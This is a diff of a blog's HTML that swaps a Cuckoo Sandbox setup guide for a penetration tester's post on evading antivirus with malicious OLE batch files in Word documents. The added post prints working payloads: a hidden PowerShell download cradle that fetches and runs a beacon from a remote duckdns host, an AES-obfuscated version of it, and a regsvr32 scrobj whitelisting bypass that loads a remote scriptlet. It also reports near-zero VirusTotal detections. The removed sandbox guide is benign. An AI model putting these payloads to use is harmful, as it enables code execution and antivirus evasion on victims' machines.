@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.20.2">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>Playing with Cuckoo</title>
+    <title>How to Accidently Win Against AV</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,19 +31,19 @@
     
 
     
-    <meta name="description" content="After the release and complete hubbub that WannaCry caused, I thought it would be fun to play with Cuckoo Sandbox.
+    <meta name="description" content="Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.
 
 ">
-    <meta property="og:description" content="After the release and complete hubbub that WannaCry caused, I thought it would be fun to play with Cuckoo Sandbox.
+    <meta property="og:description" content="Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Playing with Cuckoo">
-    <meta property="og:url" content="/2017/05/playing-with-cuckoo/">
+    <meta property="og:title" content="How to Accidently Win Against AV">
+    <meta property="og:url" content="/2017/07/how-to-accidently-win-against-av/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="After the release and complete hubbub that WannaCry caused, I thought it would be fun to play with Cuckoo Sandbox.
+    <meta name="twitter:description" content="Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.
 
 ">
     
@@ -59,7 +59,7 @@
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/cuckoo/cuckoo-icon.png">
+      <meta property="og:image" content="https://rastamouse.me/images/antivirus/av_icon.png">
     
     
     
@@ -251,18 +251,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Playing with Cuckoo
+      How to Accidently Win Against AV
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2017-05-18T00:00:00Z">
+    <time itemprop="datePublished" datetime="2017-07-05T00:00:00Z">
       
   
   
   
   
-    18 May 2017
+    5 July 2017
   
 
     </time>
@@ -283,296 +283,96 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>After the release and complete hubbub that <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack">WannaCry</a> caused, I thought it would be fun to play with <a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a>.</p>
+              <p>Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.</p>
 
 <p></p>
 
-<p>It&rsquo;s something I&rsquo;ve always had an interest in, but have never taken the time to indulge.</p>
+<p>The majority of penetration testers and red teamers will have experienced a situation where they&rsquo;ve needed to bypass an antivirus solution to execute malicious code (either pre or post exploitation).  Frameworks such as <a href="https://github.com/Veil-Framework/Veil">Veil</a> make hundereds of different techniques accessible at the push of a button.</p>
 
-<p>The <a href="https://cuckoo.sh/docs/">Cuckoo Documentation</a> is very well written and will honestly get someone 95% towards getting a working instance setup.  I had a few niggling issues that I don&rsquo;t think are covered within the docs (I could be wrong, correct me if so).  This post is a quick whistle-stop tour of how I went about getting it working.</p>
+<p>Social engineering is a common element during engagements - especially of the Red Team variety.  Whether you&rsquo;re doing phishing or a USB drop, delivering malicious Office documents is a very popular way of getting malicious code execution.  This is due, in no small way, to Office having native tools that can be leveraged, such as macro&rsquo;s, OLE and PowerPoint Custom Actions.  Many businesses use macro&rsquo;s legitimately to do clever things in Excel docs; OLE to distribute other files within documents and so on.  This means that seeing macro&rsquo;s and embedded objects is not out of place, it&rsquo;s BAU.  The challenge for users, AV vendors and Blue Teams, is differentiating the benige from the hostile and striking that balance between not blocking enough and blocking too much.</p>
 
-<blockquote>
-<p>Note: I didn&rsquo;t follow all the best practices and this is not a guide to setting up a complete, proper and scalable solution.  It assumes you don&rsquo;t have a dedicated server and are just looking to experiment with Cuckoo on an existing desktop/laptop.</p>
-</blockquote>
+<p>Anybody following <a href="https://twitter.com/JohnLaTwC">John Lambert</a> will know that malicious OLE&rsquo;s are on the map right now and there are some great examples of rather complex and sophisticated payloads.  But do they have to be&hellip;?  Well obviously that depends on the maturity of your target, but I was interested to find out just what the state of play is with AV vs OLE.</p>
 
-<h2 id="foreword">Foreword</h2>
+<p>To the laboratory.</p>
 
-<p>There are lots of virtualisation technologies that Cuckoo is compatible with - from VirtualBox, ESXi, KVM and so on.  I&rsquo;m running Windows 10 on my desktop, so I initially wanted to run Cuckoo in a VM within VirtualBox and have futher VirtualBox VMs inside that Cuckoo VM.  Nested hypervisors doesn&rsquo;t sound very efficient but with relatively mature VT-x and AMD-V technology, the performance impact seems rather negligible.</p>
 
-<p>I ran into my first frustration with VirtualBox, as it doesn&rsquo;t pass VT-x/AMD-V through to its guest VMs.  The upshot of this is that if you run Cuckoo inside VirtualBox on your host, you then can&rsquo;t have 64-bit VMs for the malware sandboxes.  VMware Workstation Player doesn&rsquo;t have this restriction, so I opted to use this instead of VirtualBox on my host.</p>
-
-<p>You will obviously need to decide if this is an issue for you based on your planned usage.</p>
-
-<p>The architecture that we are going to setup, looks as follows:</p>
-
-<p>
 <figure >
     
-        <img src="https://rastamouse.me/images/cuckoo/arch.png" />
+        <img src="https://rastamouse.me/images/antivirus/dexters-lab.jpg" />
     
     
 </figure>
 
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/network.png" />
-    
-    
-</figure>
-</p>
-
-<p>So that&rsquo;s a bunch of VirtualBox VMs running inside a VMware VM :)</p>
-
-<h2 id="configuring-the-cuckoo-host">Configuring the Cuckoo Host</h2>
-
-<p>I&rsquo;m using Ubuntu Server 16.04.2 64-bit.  You will need enough resources for it to run itself and at least 1 concurrent VM inside; and a sh*t tonne of storage if you want to do full memory dumps.</p>
-
-<p>I gave mine:</p>
-
-<ul>
-<li>8 CPU Cores
-
-<ul>
-<li>Tick <code>Enable Virtualize Intel VT-x/EPT or AMD-V/RVI</code></li>
-</ul></li>
-<li>4GB RAM</li>
-<li>100GB Hard Disk</li>
-<li>NIC 1: NAT</li>
-<li>NIC 2: Host-Only</li>
-</ul>
-
-<h3 id="software">Software</h3>
-
-<pre><code class="language-bash">cuckoo@cuckoo:~$ echo deb http://download.virtualbox.org/virtualbox/debian xenial contrib | sudo tee -a /etc/apt/sources.list.d/virtualbox.list
-cuckoo@cuckoo:~$ wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
-cuckoo@cuckoo:~$ sudo apt-get update
-cuckoo@cuckoo:~$ sudo apt-get install python python-pip python-dev libffi-dev libssl-dev python-virtualenv python-setuptools libjpeg-dev zlib1g-dev swig mongodb xfce4 virtualbox-5.1 tcpdump apparmor-utils
-
-cuckoo@cuckoo:~$ sudo aa-disable /usr/sbin/tcpdump
-cuckoo@cuckoo:~$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
-
-cuckoo@cuckoo:~$ git clone https://github.com/volatilityfoundation/volatility.git
-cuckoo@cuckoo:~$ pip install -U pip pycrypto distorm3
-cuckoo@cuckoo:~$ cd volatility/
-cuckoo@cuckoo:~/volatility$ sudo python setup.py install
-
-cuckoo@cuckoo:~$ virtualenv cuckoo
-cuckoo@cuckoo:~$ . cuckoo/bin/activate
-(cuckoo) cuckoo@cuckoo:~$ pip install -U yara-python cuckoo
-
-(cuckoo) cuckoo@cuckoo:~$ cuckoo
-
-            _       _                   _             _              _            _
-          /\ \     /\_\               /\ \           /\_\           /\ \         /\ \
-         /  \ \   / / /         _    /  \ \         / / /  _       /  \ \       /  \ \
-        / /\ \ \  \ \ \__      /\_\ / /\ \ \       / / /  /\_\    / /\ \ \     / /\ \ \
-       / / /\ \ \  \ \___\    / / // / /\ \ \     / / /__/ / /   / / /\ \ \   / / /\ \ \
-      / / /  \ \_\  \__  /   / / // / /  \ \_\   / /\_____/ /   / / /  \ \_\ / / /  \ \_\
-     / / /    \/_/  / / /   / / // / /    \/_/  / /\_______/   / / /   / / // / /   / / /
-    / / /          / / /   / / // / /          / / /\ \ \     / / /   / / // / /   / / /
-   / / /________  / / /___/ / // / /________  / / /  \ \ \   / / /___/ / // / /___/ / /
-  / / /_________\/ / /____\/ // / /_________\/ / /    \ \ \ / / /____\/ // / /____\/ /
-  \/____________/\/_________/ \/____________/\/_/      \_\_\\/_________/ \/_________/
-
- Cuckoo Sandbox 2.0.2
- www.cuckoosandbox.org
- Copyright (c) 2010-2017
-
-=======================================================================
-    Welcome to Cuckoo Sandbox, this appears to be your first run!
-    We will now set you up with our default configuration.
-    You will be able to see and modify the Cuckoo configuration,
-    Yara rules, Cuckoo Signatures, and much more to your likings
-    by exploring the /home/cuckoo/.cuckoo directory.
-
-    Among other configurable items of most interest is the
-    new location for your Cuckoo configuration:
-              /home/cuckoo/.cuckoo/conf
-=======================================================================
-
-Cuckoo has finished setting up the default configuration.
-Please modify the default settings where required and
-start Cuckoo again (by running `cuckoo` or `cuckoo -d`).
-</code></pre>
-
-<h2 id="configuring-the-guest-vms">Configuring the Guest VMs</h2>
-
-<p>Hop into the GUI by running <code>startx</code>. Open VirtualBox and create your base VMs - I&rsquo;m just going to create Windows 7 32-bit &amp; 64-bit VMs called <code>Win7x86</code> and <code>Win7x64</code> respectively.  They small VMs with 1 CPU, 512MB RAM, 10GB HDD and 1 NIC attached to <code>vboxnet0</code>.</p>
+<p>This is the mock Word doc.  In all cases, the OLE is a simple batch file, called <code>unlock.bat</code> that contains my malicious code.  All it requires is the user to run the file.</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/cuckoo/vbox.png" />
+        <img src="https://rastamouse.me/images/antivirus/doc.png" />
     
     
 </figure>
 
 
-<p>Set a static IP in each VM.</p>
+<h3 id="test-1">Test 1</h3>
 
-<ul>
-<li>Win7x86 - 192.168.56.10</li>
-<li>Win7x64 - 192.168.56.15</li>
-</ul>
+<p>The first test contains the most basic PowerShell download cradle to grab and run a staged http beacon.</p>
 
-<p>You will also want to:</p>
-
-<ul>
-<li>Disable the Windows Firewall</li>
-<li>Disable UAC (Never Notify)</li>
-<li>Disable Windows Updates</li>
-</ul>
-
-<p>Download the latest <a href="https://www.python.org/downloads/windows/">Python 2.7.x for Windows</a> and place them in a convenient location on the Cuckoo VM (I got both the 32 and 64-bit versions).  You should also grab any additional software you may want, depending on the samples you want to submit (e.g. Office, Adobe Reader etc).</p>
-
-<pre><code class="language-bash">cuckoo@cuckoo:~/Downloads$ ll
--rw-rw-r--  1 cuckoo cuckoo 20082688 May 18 19:22 python-2.7.13.amd64.msi
--rw-rw-r--  1 cuckoo cuckoo 19161088 May 18 19:22 python-2.7.13.msi
-
-cuckoo@cuckoo:~/Downloads$ python -m SimpleHTTPServer
-Serving HTTP on 0.0.0.0 port 8000 ...
+<pre><code>powershell.exe -nop -w hidden -c &quot;iex ((new-object net.webclient).downloadstring('http://kobaruto.duckdns.org/a'))&quot;
 </code></pre>
 
-<p>On each VM, open <code>Internet Explorer</code> and navigate to <code>http://192.168.56.1:8000</code>, download the relevant Python package then install it.</p>
-
-<p>Use the same method to transfer the Cuckoo Agent (to somewhere easy like the Desktop).</p>
-
-<pre><code class="language-bash">cuckoo@cuckoo:~/Downloads$ cd ../.cuckoo/agent/
-cuckoo@cuckoo:~/.cuckoo/agent$ ll
-
--rw-rw-r--  1 cuckoo cuckoo 12307 May 18 18:15 agent.py
--rwxrwxr-x  1 cuckoo cuckoo   386 May 18 18:15 agent.sh*
-
-cuckoo@cuckoo:~/.cuckoo/agent$ python -m SimpleHTTPServer
-Serving HTTP on 0.0.0.0 port 8000 ...
-</code></pre>
-
-<p>Start the agent by opening a <code>Command Prompt as Administrator</code>.</p>
+<p>This resulted in only 1 hit on VT.  Congrats ClamAV&hellip;</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/cuckoo/agent.png" />
+        <img src="https://rastamouse.me/images/antivirus/vt1.png" />
     
     
 </figure>
 
 
-<p>You won&rsquo;t see any output, just minimise the window and leave it running.</p>
+<h3 id="test-2">Test 2</h3>
 
-<p>Whilst the VMs are running, follow these steps to snapshot them (repeat for each VM):</p>
+<p>The second test uses the same download cradle as above, but run through <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> with the <code>AES Encoding</code> and <code>CMD + PowerShell Launcher</code> options.</p>
 
-<pre><code class="language-bash">cuckoo@cuckoo:~$ VBoxManage snapshot &quot;Win7x86&quot; take &quot;Win7x86_snap&quot; --pause
-0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
-Snapshot taken. UUID: 4ef19a21-25c8-4ddf-81b2-4a65ce2b5278
-
-cuckoo@cuckoo:~$ VBoxManage controlvm &quot;Win7x86&quot; poweroff
-0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
-
-cuckoo@cuckoo:~$ VBoxManage snapshot &quot;Win7x86&quot; restorecurrent
-Restoring snapshot 4ef19a21-25c8-4ddf-81b2-4a65ce2b5278
-0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
+<pre><code>CMd   /C POwERSHeLl -WINDowSTY HIddEn -NonInTEr -NoprOFi   &quot;. ( $vERboSeprEFERenCE.tosTRINg()[1,3]+'x'-JOiN'') (([rUntImE.inTEROpsERvICES.marsHaL]::pTRtOsTRinGUNi([ruNTImE.inTEropsERvICES.maRshaL]::SECUReSTRINGTOgLoBalAlLoCUNIcoDe( $('76492d1116743f0423413b16050a5345MgB8ADQAbgB5AFkAegBvAG0AdwBkAEMAaQBIAHMAVABkAEkAQwBCAC8AegBDAGcAPQA9AHwANgBjADQAMAA4ADgAYwA2ADAAYQAyAGUANgA5AGIAOQBiADQAOQA1ADQAZABjADEAMwBkAGMAMgBjAGIANAA4ADYANABmADcAZgBiADEANABjADUAYwBkADUAYwBjAGEAZAAzADgAOQBmADAAYQBjADUAYwA3ADAAMwA3ADUAMgA5ADIANgA3ADMAMABkADIAZgAxADEANABkAGEAZgBjADAAMQA1ADQAMgBjADEANQAwADMAYQAzAGYAZAA3ADQAOABhAGEAOAA4ADkAYwAwAGUAYwAyAGEAZQBiADQAYwAzADcANAA5ADMAZgAxADQAZAA4ADkAZgAxAGQAMAAxADAAOAA3AGIAOQBiADQAOQA3ADgANQBmAGQAZgAxADcAYQBjADEAMgBhADkAZAAzADEAMQA0AGUANQA0ADMANgA5AGEAMgA2ADYANQAwAGMANwBmADgAMwAyADYANAAwAGIAYwA0AGQAOABlADgANAA2ADUAZgAwAGMAYgA2AGQAOAAwADgAOABjAGIAYQAxADIANwBkADMAYwA0ADgANQA2ADAAMAA0AGIANwA4AGMAZABiADIAOABkADQAYQA0AGEAOAA5ADcAMgBhAGQAYgA5ADkAMQBiAGIAOQBhADIAMwBiAGUAOQA2AGIANABmADQANwA1ADUAOQA3AGUAZgAzADEANAA4AGQANAA4AGEAYwA2ADcAMQAwADgAOQAzAGQAYgA4AGYAMwA1ADQAOAA4ADQAMQBjAGIAZQBhADMAYwAzAGEAMABkADQAMgA0AGYAZgBmADIAOAA2ADAAZAA4AGIAYQBkADkAYwBhAGEANwBkADEAMwBmAGIAYQAzADgAMgBlAGQAYgBkADMANgBmADcAYQAxAGQAYgA1ADYANwA1ADcANABmADAAZAAzADUAMgA0ADEANQA1ADYAMwA='|CoNveRTto-seCurEStRING -KE (11..34)))) ) )&quot;
 </code></pre>
 
-<p>In the GUI, they should appear as <code>Saved</code>.</p>
+<p>0 hits.</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/cuckoo/vbox-saved.png" />
+        <img src="https://rastamouse.me/images/antivirus/vt2.png" />
     
     
 </figure>
 
 
-<h2 id="configuring-cuckoo">Configuring Cuckoo</h2>
+<h3 id="test-3">Test 3</h3>
 
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ vim .cuckoo/conf/virtualbox.conf
+<p>The third used some of the application whitelisting bypass work by <a href="https://gist.githubusercontent.com/subTee/618d40aa4229581925eb9025429d8420/raw/e054741f26850e87ed1b14c7cd039471d2945fd0/example.cs">Casey Smith</a>.</p>
+
+<pre><code>regsvr32 /s /u /n /i:https://gist.githubusercontent.com/rasta-mouse/b93a7eafacee04837fb59b53ca27025c/raw/203c8b0740313a91147d7c33e3e4a278b4863d73/http.sct scrobj.dll
 </code></pre>
 
-<ul>
-<li><code>mode = headless</code> -&gt; <code>mode = gui</code> is useful for testing.</li>
-<li><code>machines = cuckoo1</code> -&gt; <code>machines = Win7x86,Win7x64</code> plus any others you&rsquo;ve made.</li>
-</ul>
-
-<p><code>cuckoo1</code> is the default example.  Each VM needs its own little block.</p>
-
-<pre><code>[Win7x86]
-label = Win7x86
-platform = windows
-ip = 192.168.56.10
-snapshot = Win7x86_snap
-
-[Win7x64]
-label = Win7x64
-platform = windows
-ip = 192.168.56.15
-snapshot = Win7x64_snap
-</code></pre>
-
-<p>Now you should be able to run <code>cuckoo</code>.</p>
-
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ cuckoo
-
-                          .:
-                          ::
-    .-.     ,  :   .-.    ;;.-.  .-.   .-.
-   ;       ;   ;  ;       ;; .' ;   ;';   ;'
-   `;;;;'.'`..:;._`;;;;'_.'`  `.`;;'  `;;'
-
- Cuckoo Sandbox 2.0.2
- www.cuckoosandbox.org
- Copyright (c) 2010-2017
-
- Checking for updates...
- You're good to go!
-2017-05-18 19:56:34,318 [cuckoo.core.scheduler] INFO: Using &quot;virtualbox&quot; as machine manager
-2017-05-18 19:56:34,928 [cuckoo.core.scheduler] INFO: Loaded 2 machine/s
-2017-05-18 19:56:34,933 [cuckoo.core.scheduler] WARNING: As you've configured Cuckoo to execute parallel analyses, we recommend you to switch to a MySQL ora PostgreSQL database as SQLite might cause some issues.
-2017-05-18 19:56:34,941 [cuckoo.core.scheduler] INFO: Waiting for analysis tasks.
-</code></pre>
-
-<p>To start the web GUI:</p>
-
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ vim .cuckoo/conf/reporting.conf
-</code></pre>
-
-<p>Under <code>[mongodb]</code> : <code>enabled = no</code> -&gt; <code>enabled = yes</code>.</p>
-
-<pre><code class="language-bash">(cuckoo) cuckoo@cuckoo:~$ cuckoo web runserver 192.168.45.128:8080
-Performing system checks...
-
-System check identified no issues (0 silenced).
-May 18, 2017 - 20:00:31
-Django version 1.8.4, using settings 'cuckoo.web.web.settings'
-Starting development server at http://192.168.45.128:8080/
-Quit the server with CONTROL-C.
-</code></pre>
+<p>0 hits.</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/cuckoo/web-gui.png" />
+        <img src="https://rastamouse.me/images/antivirus/vt3.png" />
     
     
 </figure>
 
 
-<p>You can then submit a sample and enjoy the results  :)</p>
+<p>At this point, I kinda gave up - the whole thing is clearly broken&hellip;  I didn&rsquo;t expect the AV to fair particularly well, but it surprised me just how little AV seems to detect in OLE.
+Of course on a real engagement there are other considerations apart from AV, this was just a simple experiment.</p>
 
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/cuckoo/wannacry.png" />
-    
-    
-</figure>
-
-
-<h4 id="shoutout">Shoutout</h4>
-
-<p><a href="https://twitter.com/recrudesce">recrudesce</a> for his helpful tips.</p>
+<p>The other mad thing is, I received a beacon from one of the VT sandboxes and it still didn&rsquo;t flag it as malicious&hellip;</p>
               
             </div>
           </div>
@@ -584,9 +384,11 @@ Quit the server with CONTROL-C.
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/cuckoo/">cuckoo</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/antivirus/">antivirus</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/malware/">malware</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/office/">office</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/ole/">ole</a>
 
                   </div>
                 
@@ -598,7 +400,7 @@ Quit the server with CONTROL-C.
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/psexec-much/" data-tooltip="PsExec Much?">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -606,7 +408,7 @@ Quit the server with CONTROL-C.
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/05/a-citrix-story/" data-tooltip="A Citrix Story">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/cobalt-strike---spawn-as/" data-tooltip="Cobalt Strike - Spawn As">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -623,17 +425,17 @@ Quit the server with CONTROL-C.
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -679,7 +481,7 @@ Quit the server with CONTROL-C.
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/psexec-much/" data-tooltip="PsExec Much?">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -687,7 +489,7 @@ Quit the server with CONTROL-C.
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/05/a-citrix-story/" data-tooltip="A Citrix Story">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/06/cobalt-strike---spawn-as/" data-tooltip="Cobalt Strike - Spawn As">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -704,17 +506,17 @@ Quit the server with CONTROL-C.
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -741,17 +543,17 @@ Quit the server with CONTROL-C.
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fplaying-with-cuckoo%2f">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f07%2fhow-to-accidently-win-against-av%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -975,9 +777,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2017\/05\/playing-with-cuckoo\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2017\/07\/how-to-accidently-win-against-av\/';
           
-            this.page.identifier = '\/2017\/05\/playing-with-cuckoo\/'
+            this.page.identifier = '\/2017\/07\/how-to-accidently-win-against-av\/'
           
         };
         (function() {
